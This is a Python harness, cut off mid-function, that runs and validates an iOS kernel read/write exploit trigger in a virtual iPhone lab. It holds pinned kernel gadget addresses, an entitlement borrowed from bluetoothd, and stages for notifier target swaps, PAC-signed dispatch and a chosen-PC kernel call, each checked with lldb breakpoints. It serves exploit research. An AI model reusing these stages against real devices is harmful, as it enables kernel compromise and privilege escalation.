#!/usr/bin/env python3
"""Run the KRW-only IOUserEthernet entitlement-borrow trigger in vPhone."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import shlex
import signal
import subprocess
import tempfile
import time
from pathlib import Path
from typing import Any, NamedTuple

from cnd_rea_secure_execution import write_json
from cnd_remotecall_lab import DEFAULT_KNOWN_HOSTS, LabError, SSH, require_vphone
from cnd_vphone_krw import (
    STANDALONE_KRW_SOCKET_PATH,
    build_binary,
    debugger_kernel_address,
)


REPO_ROOT = Path(__file__).resolve().parents[2]
TRIGGER_SOURCE = REPO_ROOT / "scripts/lab/cnd_iouserethernet_krw_trigger.m"
DONOR_EXECUTABLE = "/usr/sbin/bluetoothd"
DONOR_ENTITLEMENT = "com.apple.networking.ethernet.user-access"


# ---------------------------------------------------------------------------
# PRODUCER_CONSTANTS: the one home for every literal this validator pins that
# the producer (cnd_iouserethernet_krw_trigger.m, iOS 26.0 23A341 vPhone
# layout) also carries. Each entry cites the .m line(s) holding it and the
# exact text found there. `direct` entries are the same literal on both
# sides. `direct=False` entries are tied to something else on the cited line
# (a symbol, a format string, an array, an instruction) and the note says
# what; no value here is bound to a .m literal that does not exist.
# test_producer_constants_match_cited_source_lines re-reads the .m and fails
# when a citation drifts. Implemented-level: this binds text to text and
# proves nothing about what the VM emitted.
# ---------------------------------------------------------------------------


class ProducerConstant(NamedTuple):
    value: Any
    lines: tuple[int, ...]   # 1-based lines in TRIGGER_SOURCE
    anchor: str              # text that must occur on every cited line
    direct: bool             # anchor is the literal form of value
    note: str


PRODUCER_CONSTANTS: dict[str, ProducerConstant] = {}


def _producer(name: str, value: Any, lines: tuple[int, ...], anchor: str,
              direct: bool, note: str) -> Any:
    PRODUCER_CONSTANTS[name] = ProducerConstant(
        value, lines, anchor, direct, note)
    return value


STATIC_KERNEL_BASE = _producer(  # .m:25
    "STATIC_KERNEL_BASE", 0xFFFFFE0007004000, (25,), "0xfffffe0007004000",
    True, "CNDStaticKernelBase: the exact-build fileset base")
STATIC_PAGE_SIZE = _producer(  # .m:2349-2350
    "STATIC_PAGE_SIZE", 0x4000, (2349, 2350), "UINT64_C(0x4000)", True,
    "the base-to-debugger-text gap the producer accepts as a matching "
    "boot layout")
STATIC_TEXT = _producer(  # .m:25 + .m:2349
    "STATIC_TEXT", STATIC_KERNEL_BASE + STATIC_PAGE_SIZE, (25,),
    "0xfffffe0007004000", False,
    "exact-build debugger text address = STATIC_KERNEL_BASE + "
    "STATIC_PAGE_SIZE; not itself a .m literal, the producer only enforces "
    "the gap (.m:2348-2350)")
STATIC_SANDBOX_NOTIFICATION_ACTION = _producer(  # .m:35
    "STATIC_SANDBOX_NOTIFICATION_ACTION", 0xFFFFFE0009398E6C, (35,),
    "0xfffffe0009398e6c", True, "CNDStaticSandboxNotificationAction")
STATIC_SANDBOX_PUBLISH_CALLBACK = _producer(  # .m:37
    "STATIC_SANDBOX_PUBLISH_CALLBACK", 0xFFFFFE00093AE0D8, (37,),
    "0xfffffe00093ae0d8", True, "CNDStaticSandboxPublishCallback")
STATIC_NOOP_BLOCK = _producer(  # .m:39
    "STATIC_NOOP_BLOCK", 0xFFFFFE0007A59288, (39,), "0xfffffe0007a59288",
    True, "CNDStaticNoOpBlock")
STATIC_NOOP_BLOCK_INVOKE = _producer(  # .m:41
    "STATIC_NOOP_BLOCK_INVOKE", 0xFFFFFE00093BAC64, (41,),
    "0xfffffe00093bac64", True, "CNDStaticNoOpBlockInvoke")
STATIC_2ABE_ADAPTER = _producer(  # .m:49
    "STATIC_2ABE_ADAPTER", 0xFFFFFE000818A05C, (49,), "0xfffffe000818a05c",
    True, "CNDStatic2ABEAdapter")
STATIC_73D8_RETURN = _producer(  # .m:53
    "STATIC_73D8_RETURN", 0xFFFFFE0007C55354, (53,), "0xfffffe0007c55354",
    True, "CNDStatic73D8Return")
XPACI_ADDRESS_BITS = _producer(  # .m:356
    "XPACI_ADDRESS_BITS", 0x00007FFFFFFFFFFF, (356,), "0xdac143e0", False,
    "software stand-in for xpaci x0 (CNDStripInstructionPointer): the 47 "
    "address bits kept; the .m holds the instruction encoding, not a mask")
XPACI_KERNEL_FILL = _producer(  # .m:356
    "XPACI_KERNEL_FILL", 0xFFFF800000000000, (356,), "0xdac143e0", False,
    "software stand-in for xpaci x0: the TTBR1 top bits refilled; the .m "
    "holds the instruction encoding, not a mask")
REPORT_SCHEMA = _producer(  # .m:2274
    "REPORT_SCHEMA", "com.zeroxjf.cyanide.iouserethernet-krw-trigger",
    (2274,), '@"com.zeroxjf.cyanide.iouserethernet-krw-trigger"', True,
    "report schema identifier")
REPORT_SCHEMA_VERSION = _producer(  # .m:2275
    "REPORT_SCHEMA_VERSION", 1, (2275,), "@1", True, "report schemaVersion")
ZERO_KR = _producer(  # .m:268
    "ZERO_KR", "0x0000000000000000", (268,), "0x%016llx", False,
    "CNDHex(KERN_SUCCESS): the 16-digit CNDHex format applied to zero; "
    "no .m literal spells the zero string")
RESULT_BORROW = _producer(  # .m:2911
    "RESULT_BORROW", "krw-borrow-triggered-normal-signer-path", (2911,),
    '@"krw-borrow-triggered-normal-signer-path"', True, "mode A result")
RESULT_TARGET_SWAP = _producer(  # .m:2904
    "RESULT_TARGET_SWAP",
    "krw-notifier-target-swap-triggered-stock-61de-dispatch", (2904,),
    '@"krw-notifier-target-swap-triggered-stock-61de-dispatch"', True,
    "mode B result")
RESULT_BLOCK_CANARY = _producer(  # .m:2906
    "RESULT_BLOCK_CANARY", "krw-notifier-block-noop-dispatch-survived",
    (2906,), '@"krw-notifier-block-noop-dispatch-survived"', True,
    "mode C result")
RESULT_SANDBOX_CANARY = _producer(  # .m:2908
    "RESULT_SANDBOX_CANARY", "krw-notifier-sandbox-iazero-dispatch-survived",
    (2908,), '@"krw-notifier-sandbox-iazero-dispatch-survived"', True,
    "mode D result")
RESULT_2ABE_73D8_CANARY = _producer(  # .m:2910
    "RESULT_2ABE_73D8_CANARY", "krw-notifier-2abe-73d8-dispatch-survived",
    (2910,), '@"krw-notifier-2abe-73d8-dispatch-survived"', True,
    "mode E result")
RESULT_CHECK_MULTI = _producer(  # .m:2902
    "RESULT_CHECK_MULTI",
    "krw-ifnet-check-multi-arbitrary-target-pac-executed", (2902,),
    '@"krw-ifnet-check-multi-arbitrary-target-pac-executed"', True,
    "mode F result (the word 'arbitrary' is wider than the evidence; "
    "renaming it is a .m-owner request)")
RESULT_KCALL1 = _producer(  # .m:2900
    "RESULT_KCALL1", "krw-ifnet-kcall1-chosen-pc-x0-executed", (2900,),
    '@"krw-ifnet-kcall1-chosen-pc-x0-executed"', True, "mode G result")
RESULT_SYSCTL_CENSUS = _producer(  # .m:564
    "RESULT_SYSCTL_CENSUS", "sysctl-pac-census-complete", (564,),
    '@"sysctl-pac-census-complete"', True, "mode H result")
CHECK_MULTI_DISCRIMINATOR = _producer(  # .m:1328
    "CHECK_MULTI_DISCRIMINATOR", "0xe4fe", (1328,), '@"0xe4fe"', True,
    "IA discriminator string the producer pins for check_multi")
ENOEXEC_NAME = _producer(  # .m:2798
    "ENOEXEC_NAME", "ENOEXEC", (2798,), '@"ENOEXEC"', True,
    "errno name the producer emits when the check-multi ioctl returned "
    "ENOEXEC")
ENOEXEC_VALUE = _producer(  # .m:2798, .m:2891
    "ENOEXEC_VALUE", 8, (2798, 2891), "ENOEXEC", False,
    "Darwin <sys/errno.h> ENOEXEC; the producer uses the symbol, never the "
    "digit, so the value is tied to the SDK header and cross-checked "
    "against the host errno module on Darwin")
EINPROGRESS_NAME = _producer(  # .m:2213
    "EINPROGRESS_NAME", "EINPROGRESS", (2213,), '@"EINPROGRESS"', True,
    "errno name the producer emits when the kcall1 ioctl returned "
    "EINPROGRESS")
EINPROGRESS_VALUE = _producer(  # .m:2075, .m:2148, .m:2229
    "EINPROGRESS_VALUE", 36, (2075, 2148, 2229), "EINPROGRESS", False,
    "Darwin <sys/errno.h> EINPROGRESS: the kcall1 marker word and the "
    "expected trigger errno; the producer uses the symbol, never the digit")
KCALL1_ARITY = _producer(  # .m:2076
    "KCALL1_ARITY", 1, (2076,), "@1", True,
    "ifnetKCall1ConstructedArity, a producer constant rather than a "
    "measurement")
KCALL1_STAGE_STOCK = _producer(  # .m:2096
    "KCALL1_STAGE_STOCK", "Stock", (2096,), '@"ifnetKCall1Stock"', False,
    "stage suffix of the CNDReportSignedIfnet prefix")
KCALL1_STAGE_LOAD = _producer(  # .m:2097
    "KCALL1_STAGE_LOAD", "Load", (2097,), '@"ifnetKCall1Load"', False,
    "stage suffix of the CNDReportSignedIfnet prefix")
KCALL1_STAGE_DISPATCHER = _producer(  # .m:2098
    "KCALL1_STAGE_DISPATCHER", "Dispatcher", (2098,),
    '@"ifnetKCall1Dispatcher"', False,
    "stage suffix of the CNDReportSignedIfnet prefix")
CENSUS_CANDIDATE_COUNT = _producer(  # .m:504-515
    "CENSUS_CANDIDATE_COUNT", 5, (504,), "candidates[] = {", False,
    "number of initialisers in the sysctl candidates array (.m:504-515), "
    "emitted as records.count at .m:552; no .m literal spells the count")


def _hex(value: int) -> str:
    return f"0x{value:016x}"


def _kernel_object(value: int) -> bool:
    return 0xFFFFFE1000000000 <= value <= 0xFFFFFE3FFFFFFFFF and \
        value & 7 == 0


def _code_pointer(value: int) -> int:
    return (value & XPACI_ADDRESS_BITS) | XPACI_KERNEL_FILL


def _live_slide(debugger_load_address: str) -> int:
    """Slide of the live exact-build text relative to STATIC_TEXT."""
    live_text = int(debugger_load_address, 16)
    if live_text < STATIC_TEXT or live_text & (STATIC_PAGE_SIZE - 1):
        raise LabError("KDP returned an invalid exact-build live text address")
    return live_text - STATIC_TEXT


def _registers(transcript: str) -> dict[str, int]:
    result: dict[str, int] = {}
    for name, value in re.findall(
        r"^\s*(pc|x[0-5])\s*=\s*(0x[0-9a-fA-F]+)\b",
        transcript, re.MULTILINE,
    ):
        result[name] = int(value, 16)
    return result


# ---------------------------------------------------------------------------
# _report_checks: the single implementation of every report-field idiom used
# by validate_result and the KDP runners. Every helper raises LabError in the
# established "<where> ...: <key>" style. These are implemented-level checks
# on a report dict; they prove nothing about the VM or the phone by themselves.
# ---------------------------------------------------------------------------


def _typed_equal(actual: Any, expected: Any) -> bool:
    """Equality that never lets True/1 or False/0 stand in for each other."""
    if isinstance(expected, bool) or isinstance(actual, bool):
        return isinstance(actual, bool) and isinstance(expected, bool) and \
            actual is expected
    if isinstance(expected, int):
        return isinstance(actual, int) and actual == expected
    return type(actual) is type(expected) and actual == expected


def _present(value: Any, key: str, where: str) -> Any:
    if not isinstance(value, dict) or key not in value:
        raise LabError(f"{where} field missing or mistyped: {key}")
    return value[key]


def require_str(value: Any, key: str, where: str, *,
                expected: str | None = None) -> str:
    """Key present, a nonempty str, and equal to `expected` when given."""
    item = _present(value, key, where)
    if not isinstance(item, str) or not item:
        raise LabError(f"{where} field missing or mistyped: {key}")
    if expected is not None and item != expected:
        raise LabError(f"{where} invariant failed: {key}")
    return item


def require_int(value: Any, key: str, where: str, *,
                expected: int | None = None, minimum: int | None = None,
                bool_is_error: bool = True) -> int:
    """Key present and an int; True/False rejected unless bool_is_error=False."""
    item = _present(value, key, where)
    if not isinstance(item, int) or \
            (bool_is_error and isinstance(item, bool)):
        raise LabError(f"{where} field missing or mistyped: {key}")
    if expected is not None and item != expected:
        raise LabError(f"{where} invariant failed: {key}")
    if minimum is not None and item < minimum:
        raise LabError(f"{where} invariant failed: {key}")
    return item


def require_bool(value: Any, key: str, where: str, *,
                 expected: bool | None = None) -> bool:
    """Key present and exactly a bool (`is` comparison, never `==`)."""
    item = _present(value, key, where)
    if not isinstance(item, bool):
        raise LabError(f"{where} field missing or mistyped: {key}")
    if expected is not None and item is not expected:
        raise LabError(f"{where} invariant failed: {key}")
    return item


def require_pinned(value: Any, pinned: dict[str, Any], where: str) -> None:
    """Apply require_bool / require_int / require_str per pinned type."""
    for key, expected in pinned.items():
        if isinstance(expected, bool):
            require_bool(value, key, where, expected=expected)
        elif isinstance(expected, int):
            require_int(value, key, where, expected=expected)
        elif isinstance(expected, str):
            require_str(value, key, where, expected=expected)
        else:  # pragma: no cover - programming error in the pinned table
            raise TypeError(f"unsupported pinned type for {key}")


def bound_equals(value: Any, key_a: str, key_b: str, where: str, *,
                 message: str | None = None) -> None:
    """Both keys present, same type, equal. Absence or mistyping is an error."""
    a = _present(value, key_a, where)
    b = _present(value, key_b, where)
    for key, item in ((key_a, a), (key_b, b)):
        if isinstance(item, bool) or not isinstance(item, (int, str)) or \
                (isinstance(item, str) and not item):
            raise LabError(f"{where} field missing or mistyped: {key}")
    if type(a) is not type(b) or a != b:
        raise LabError(message or f"{where} {key_a} did not match {key_b}")


def distinct_members(value: Any, keys: dict[str, str], where: str, *,
                     created: set[str] | None = None,
                     plural: str = "members",
                     singular: str = "member") -> list[str]:
    """Each labelled key is a nonempty str, pairwise distinct, and (when
    `created` is given) a member of that collection."""
    names = [require_str(value, key, where) for key in keys.values()]
    if len(set(names)) != len(names):
        raise LabError(f"{where} {plural} are not distinct")
    if created is not None:
        for label, name in zip(keys, names):
            if name not in created:
                raise LabError(f"{where} {label} {singular} was not created")
    return names


def no_contradiction(value: Any, pairs: list[tuple[str, Any, str, Any]],
                     where: str) -> None:
    """Declared contradiction rule: for (key_a, expected_a, key_b, expected_b),
    when key_a equals expected_a (typed) and key_b is present, key_b must
    equal expected_b (typed). An absent key_b, or key_a not at expected_a,
    is not a contradiction: the rule is deliberately permissive so a report
    that omits the paired field is not faked into coherence."""
    for key_a, expected_a, key_b, expected_b in pairs:
        if not isinstance(value, dict) or key_a not in value or \
                key_b not in value:
            continue
        if not _typed_equal(value[key_a], expected_a):
            continue
        if not _typed_equal(value[key_b], expected_b):
            raise LabError(f"{where} {key_a} contradicts {key_b}")


def created_kernel_objects(trigger: Any) -> list[int]:
    """Every createdInterfaces[].kernelObject that parses as hex (pure)."""
    objects: list[int] = []
    items = trigger.get("createdInterfaces", []) \
        if isinstance(trigger, dict) else []
    for item in items if isinstance(items, list) else []:
        if not isinstance(item, dict):
            continue
        try:
            objects.append(int(item["kernelObject"], 16))
        except (KeyError, TypeError, ValueError):
            continue
    return objects


def _hex_field(trigger: Any, key: str, where: str) -> int:
    try:
        return int(trigger[key], 16)
    except (KeyError, TypeError, ValueError) as error:
        raise LabError(where) from error


def block_canary_correlation(trigger: Any) -> tuple[int, int, int, list[int]]:
    """(notifier, block, invoke, created objects) from a block-canary report.

    Pure: implemented-level extraction only; it carries no witness."""
    where = "block canary omitted its KDP correlation fields"
    return (
        _hex_field(trigger, "notificationANotifier", where),
        _hex_field(trigger, "notificationBlockAddress", where),
        _hex_field(trigger, "notificationBlockInvoke", where),
        created_kernel_objects(trigger),
    )


def sandbox_canary_correlation(trigger: Any) -> tuple[int, int, int, list[int]]:
    """(notifier, raw signed action, callback, created objects). Pure."""
    where = "sandbox canary omitted its KDP correlation fields"
    return (
        _hex_field(trigger, "notificationANotifier", where),
        _hex_field(trigger, "notificationSandboxActionRaw", where),
        _hex_field(trigger, "notificationSandboxCallback", where),
        created_kernel_objects(trigger),
    )


def pac_2abe_73d8_correlation(trigger: Any) -> tuple[int, int, list[int]]:
    """(stripped adapter, stripped 73d8 return, created objects). Pure."""
    where = "2abe/73d8 canary omitted signed-pointer evidence"
    return (
        _code_pointer(
            _hex_field(trigger, "notification2ABEAdapterRaw", where)),
        _code_pointer(
            _hex_field(trigger, "notification73D8ReturnRaw", where)),
        created_kernel_objects(trigger),
    )


def _transcript_detached(transcript: str) -> bool:
    return "stop reason = breakpoint" in transcript and \
        "Process 1 detached" in transcript


def block_canary_witness(
    trigger: Any, registers: dict[str, int], transcript: str, *,
    block: int, invoke: int, debugger_exit: int,
) -> dict[str, Any]:
    """Pure correlation of a block-canary report with KDP registers.

    Implemented-level: it only decides whether the inputs agree."""
    notifier, reported_block, reported_invoke, created_objects = \
        block_canary_correlation(trigger)
    if debugger_exit != 0 or registers.get("pc") != invoke or \
            registers.get("x0") != block or registers.get("x2") != notifier or \
            not _kernel_object(registers.get("x1", 0)) or \
            created_objects.count(registers.get("x1", 0)) != 1 or \
            reported_block != block or reported_invoke != invoke or \
            not _transcript_detached(transcript):
        raise LabError("KDP block breakpoint evidence did not match the trigger")
    return {
        "kind": "hardware-one-shot",
        "hit": True,
        "staticBlock": _hex(STATIC_NOOP_BLOCK),
        "liveBlock": _hex(block),
        "staticInvoke": _hex(STATIC_NOOP_BLOCK_INVOKE),
        "liveInvoke": _hex(invoke),
        "registers": {name: _hex(value)
                      for name, value in sorted(registers.items())},
        "notifier": _hex(notifier),
        "newService": _hex(registers["x1"]),
        "transcriptSHA256": hashlib.sha256(
            transcript.encode("utf-8")
        ).hexdigest(),
        "transcript": transcript,
    }


def sandbox_canary_witness(
    trigger: Any, registers: dict[str, int], transcript: str, *,
    action: int, callback: int, debugger_exit: int,
) -> dict[str, Any]:
    """Pure correlation of a sandbox-canary report with KDP registers."""
    notifier, reported_action, reported_callback, created_objects = \
        sandbox_canary_correlation(trigger)
    new_service = registers.get("x0", 0)
    if debugger_exit != 0 or registers.get("pc") != callback or \
            not _kernel_object(new_service) or \
            registers.get("x1") != 0 or \
            registers.get("x2") != new_service or \
            registers.get("x3") != notifier or \
            created_objects.count(new_service) != 1 or \
            reported_callback != callback or reported_action == 0 or \
            not _transcript_detached(transcript):
        raise LabError(
            "KDP sandbox breakpoint evidence did not match the trigger"
        )
    # The producer picks the donor whose xpaci(rawAction) equals the live
    # Sandbox action (.m:771, .m:1172-1173) and emits the raw word as
    # notificationSandboxActionRaw (.m:1229-1230). Re-derive that relation
    # here instead of accepting any nonzero raw word.
    if _code_pointer(reported_action) != action:
        raise LabError(
            "KDP sandbox raw signed action did not strip to the live action"
        )
    return {
        "kind": "hardware-one-shot",
        "hit": True,
        "staticAction": _hex(STATIC_SANDBOX_NOTIFICATION_ACTION),
        "liveAction": _hex(action),
        "rawSignedAction": _hex(reported_action),
        "staticCallback": _hex(STATIC_SANDBOX_PUBLISH_CALLBACK),
        "liveCallback": _hex(callback),
        "registers": {name: _hex(value)
                      for name, value in sorted(registers.items())},
        "notifier": _hex(notifier),
        "newService": _hex(new_service),
        "transcriptSHA256": hashlib.sha256(
            transcript.encode("utf-8")
        ).hexdigest(),
        "transcript": transcript,
    }


_BACKTRACE_FRAME = re.compile(
    r"^\s*\*?\s*frame #(\d+):\s*(0x[0-9a-fA-F]+)\b", re.MULTILINE)


def parse_2abe_backtrace(transcript: str, adapter: int, *,
                         span: int = 0x100) -> dict[str, Any] | None:
    """Find the 0x2abe adapter frame in an lldb `thread backtrace` dump.

    Returns {"frame", "pc", "raw"} for the lowest-numbered frame whose
    PAC-stripped pc lies in [adapter, adapter + span), or None when the
    transcript has no parsable frames or none lands there. Frames that do
    not parse are skipped, not errors. `span` is a parsing window only: the
    validator does not know the adapter's byte extent, and whether the
    adapter ever appears as a return frame (blraa) or tail-calls (braa) is a
    .m-owner / VM question. Implemented-level parsing capability; this
    round does not feed it into any witness or claim."""
    for index_text, pc_text in _BACKTRACE_FRAME.findall(transcript):
        try:
            raw = int(pc_text, 16)
        except ValueError:  # pragma: no cover - regex guarantees hex
            continue
        stripped = _code_pointer(raw)
        if adapter <= stripped < adapter + span:
            return {"frame": int(index_text), "pc": _hex(stripped),
                    "raw": _hex(raw)}
    return None


def pac_2abe_73d8_witness(
    trigger: Any, registers: dict[str, int], transcript: str, *,
    adapter: int, return_target: int, debugger_exit: int,
) -> dict[str, Any]:
    """Pure correlation of a 2abe/73d8 report with KDP registers.

    The adapter crossing is not checked here: parse_2abe_backtrace exists
    but is deliberately not consulted this round (see its docstring)."""
    reported_adapter, reported_return, created_objects = \
        pac_2abe_73d8_correlation(trigger)
    if debugger_exit != 0 or registers.get("pc") != return_target or \
            _code_pointer(registers.get("x2", 0)) != return_target or \
            not _kernel_object(registers.get("x1", 0)) or \
            created_objects.count(registers.get("x1", 0)) != 1 or \
            reported_adapter != adapter or \
            reported_return != return_target or \
            not _transcript_detached(transcript):
        raise LabError(
            "KDP 2abe/73d8 breakpoint evidence did not match the trigger"
        )
    return {
        "kind": "hardware-one-shot",
        "hit": True,
        "staticAdapter": _hex(STATIC_2ABE_ADAPTER),
        "liveAdapter": _hex(adapter),
        "staticReturn": _hex(STATIC_73D8_RETURN),
        "liveReturn": _hex(return_target),
        "registers": {name: _hex(value)
                      for name, value in sorted(registers.items())},
        "newService": _hex(registers["x1"]),
        "transcriptSHA256": hashlib.sha256(
            transcript.encode("utf-8")
        ).hexdigest(),
        "transcript": transcript,
    }


def run_block_canary_with_kdp(
    ssh: SSH, command: str, *, port: int, debugger_load_address: str,
    timeout: int = 30,
) -> tuple[str, dict[str, Any]]:
    slide = _live_slide(debugger_load_address)
    block = STATIC_NOOP_BLOCK + slide
    invoke = STATIC_NOOP_BLOCK_INVOKE + slide

    with tempfile.TemporaryDirectory(prefix="cnd-block-canary-") as directory:
        root = Path(directory)
        armed = root / "armed"
        commands = root / "block-canary.lldb"
        transcript_path = root / "lldb.txt"
        commands.write_text(
            "platform select remote-ios\n"
            f"gdb-remote 127.0.0.1:{port}\n"
            f"breakpoint set -H -o true -a {invoke:#x} "
            f"-c '$x0 == {block:#x}'\n"
            f"script open({os.fspath(armed)!r}, 'w').write('armed\\n')\n"
            "continue\n"
            "register read pc x0 x1 x2 x3 x4 x5\n"
            "thread backtrace -c 8\n"
            "process detach\n",
            encoding="utf-8",
        )
        with transcript_path.open("wb") as transcript_stream:
            lldb = subprocess.Popen(
                ["xcrun", "lldb", "--batch", "-s", os.fspath(commands)],
                stdout=transcript_stream,
                stderr=subprocess.STDOUT,
            )
            deadline = time.monotonic() + 10
            while not armed.is_file() and lldb.poll() is None and \
                    time.monotonic() < deadline:
                time.sleep(0.05)
            if not armed.is_file():
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                    try:
                        lldb.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        lldb.kill()
                        lldb.wait()
                transcript = transcript_path.read_text(
                    encoding="utf-8", errors="replace"
                )
                raise LabError(
                    "KDP block breakpoint did not arm:\n" + transcript[-4000:]
                )

            remote = subprocess.Popen(
                [*ssh.base, command], env=ssh.environment,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
            try:
                stdout, stderr = remote.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                try:
                    lldb.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    lldb.kill()
                    lldb.wait()
                try:
                    stdout, stderr = remote.communicate(timeout=10)
                except subprocess.TimeoutExpired as error:
                    remote.kill()
                    remote.wait()
                    raise LabError(
                        "block canary remained stuck after debugger detach"
                    ) from error
            if lldb.poll() is None:
                lldb.send_signal(signal.SIGINT)
            try:
                lldb.wait(timeout=10)
            except subprocess.TimeoutExpired:
                lldb.kill()
                lldb.wait()

        transcript = transcript_path.read_text(
            encoding="utf-8", errors="replace"
        )
        if remote.returncode != 0:
            detail = stderr.decode("utf-8", "replace").strip()
            raise LabError(
                f"remote block canary failed ({remote.returncode})"
                f"{chr(10) + detail if detail else ''}"
            )
        output = stdout.decode("utf-8", "replace")
        try:
            trigger = json.loads(output)
        except json.JSONDecodeError as error:
            raise LabError("block canary did not return JSON") from error
        witness = block_canary_witness(
            trigger, _registers(transcript), transcript,
            block=block, invoke=invoke, debugger_exit=lldb.returncode,
        )
        return output, witness


def run_sandbox_canary_with_kdp(
    ssh: SSH, command: str, *, port: int, debugger_load_address: str,
    timeout: int = 30,
) -> tuple[str, dict[str, Any]]:
    slide = _live_slide(debugger_load_address)
    action = STATIC_SANDBOX_NOTIFICATION_ACTION + slide
    callback = STATIC_SANDBOX_PUBLISH_CALLBACK + slide

    with tempfile.TemporaryDirectory(
        prefix="cnd-sandbox-canary-"
    ) as directory:
        root = Path(directory)
        armed = root / "armed"
        commands = root / "sandbox-canary.lldb"
        transcript_path = root / "lldb.txt"
        commands.write_text(
            "platform select remote-ios\n"
            f"gdb-remote 127.0.0.1:{port}\n"
            f"breakpoint set -H -o true -a {callback:#x}\n"
            f"script open({os.fspath(armed)!r}, 'w').write('armed\\n')\n"
            "continue\n"
            "register read pc x0 x1 x2 x3 x4 x5\n"
            "thread backtrace -c 8\n"
            "process detach\n",
            encoding="utf-8",
        )
        with transcript_path.open("wb") as transcript_stream:
            lldb = subprocess.Popen(
                ["xcrun", "lldb", "--batch", "-s", os.fspath(commands)],
                stdout=transcript_stream,
                stderr=subprocess.STDOUT,
            )
            deadline = time.monotonic() + 10
            while not armed.is_file() and lldb.poll() is None and \
                    time.monotonic() < deadline:
                time.sleep(0.05)
            if not armed.is_file():
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                    try:
                        lldb.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        lldb.kill()
                        lldb.wait()
                transcript = transcript_path.read_text(
                    encoding="utf-8", errors="replace"
                )
                raise LabError(
                    "KDP sandbox breakpoint did not arm:\n" +
                    transcript[-4000:]
                )

            remote = subprocess.Popen(
                [*ssh.base, command], env=ssh.environment,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
            try:
                stdout, stderr = remote.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                try:
                    lldb.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    lldb.kill()
                    lldb.wait()
                try:
                    stdout, stderr = remote.communicate(timeout=10)
                except subprocess.TimeoutExpired as error:
                    remote.kill()
                    remote.wait()
                    raise LabError(
                        "sandbox canary remained stuck after debugger detach"
                    ) from error
            if lldb.poll() is None:
                lldb.send_signal(signal.SIGINT)
            try:
                lldb.wait(timeout=10)
            except subprocess.TimeoutExpired:
                lldb.kill()
                lldb.wait()

        transcript = transcript_path.read_text(
            encoding="utf-8", errors="replace"
        )
        if remote.returncode != 0:
            detail = stderr.decode("utf-8", "replace").strip()
            raise LabError(
                f"remote sandbox canary failed ({remote.returncode})"
                f"{chr(10) + detail if detail else ''}"
            )
        output = stdout.decode("utf-8", "replace")
        try:
            trigger = json.loads(output)
        except json.JSONDecodeError as error:
            raise LabError("sandbox canary did not return JSON") from error
        witness = sandbox_canary_witness(
            trigger, _registers(transcript), transcript,
            action=action, callback=callback,
            debugger_exit=lldb.returncode,
        )
        return output, witness


def run_2abe_73d8_canary_with_kdp(
    ssh: SSH, command: str, *, port: int, debugger_load_address: str,
    timeout: int = 30,
) -> tuple[str, dict[str, Any]]:
    slide = _live_slide(debugger_load_address)
    adapter = STATIC_2ABE_ADAPTER + slide
    return_target = STATIC_73D8_RETURN + slide

    with tempfile.TemporaryDirectory(
        prefix="cnd-2abe-73d8-canary-"
    ) as directory:
        root = Path(directory)
        armed = root / "armed"
        commands = root / "2abe-73d8-canary.lldb"
        transcript_path = root / "lldb.txt"
        commands.write_text(
            "platform select remote-ios\n"
            f"gdb-remote 127.0.0.1:{port}\n"
            f"breakpoint set -H -o true -a {return_target:#x}\n"
            f"script open({os.fspath(armed)!r}, 'w').write('armed\\n')\n"
            "continue\n"
            "register read pc x0 x1 x2 x3 x4 x5\n"
            "thread backtrace -c 10\n"
            "process detach\n",
            encoding="utf-8",
        )
        with transcript_path.open("wb") as transcript_stream:
            lldb = subprocess.Popen(
                ["xcrun", "lldb", "--batch", "-s", os.fspath(commands)],
                stdout=transcript_stream,
                stderr=subprocess.STDOUT,
            )
            deadline = time.monotonic() + 10
            while not armed.is_file() and lldb.poll() is None and \
                    time.monotonic() < deadline:
                time.sleep(0.05)
            if not armed.is_file():
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                    try:
                        lldb.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        lldb.kill()
                        lldb.wait()
                transcript = transcript_path.read_text(
                    encoding="utf-8", errors="replace"
                )
                raise LabError(
                    "KDP 2abe/73d8 breakpoint did not arm:\n" +
                    transcript[-4000:]
                )

            remote = subprocess.Popen(
                [*ssh.base, command], env=ssh.environment,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
            try:
                stdout, stderr = remote.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                try:
                    lldb.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    lldb.kill()
                    lldb.wait()
                try:
                    stdout, stderr = remote.communicate(timeout=10)
                except subprocess.TimeoutExpired as error:
                    remote.kill()
                    remote.wait()
                    raise LabError(
                        "2abe/73d8 canary remained stuck after debugger detach"
                    ) from error
            if lldb.poll() is None:
                lldb.send_signal(signal.SIGINT)
            try:
                lldb.wait(timeout=10)
            except subprocess.TimeoutExpired:
                lldb.kill()
                lldb.wait()

        transcript = transcript_path.read_text(
            encoding="utf-8", errors="replace"
        )
        if remote.returncode != 0:
            detail = stderr.decode("utf-8", "replace").strip()
            raise LabError(
                f"remote 2abe/73d8 canary failed ({remote.returncode})"
                f"{chr(10) + detail if detail else ''}"
            )
        output = stdout.decode("utf-8", "replace")
        try:
            trigger = json.loads(output)
        except json.JSONDecodeError as error:
            raise LabError("2abe/73d8 canary did not return JSON") from error
        witness = pac_2abe_73d8_witness(
            trigger, _registers(transcript), transcript,
            adapter=adapter, return_target=return_target,
            debugger_exit=lldb.returncode,
        )
        return output, witness


def exact_process_pid(report: str, executable: str) -> int:
    matches: list[int] = []
    for line in report.splitlines():
        pid_text, separator, command = line.strip().partition(" ")
        if not separator or command.strip() != executable:
            continue
        try:
            pid = int(pid_text)
        except ValueError as error:
            raise LabError("donor process has an invalid PID") from error
        if pid > 1:
            matches.append(pid)
    if len(matches) != 1:
        raise LabError(
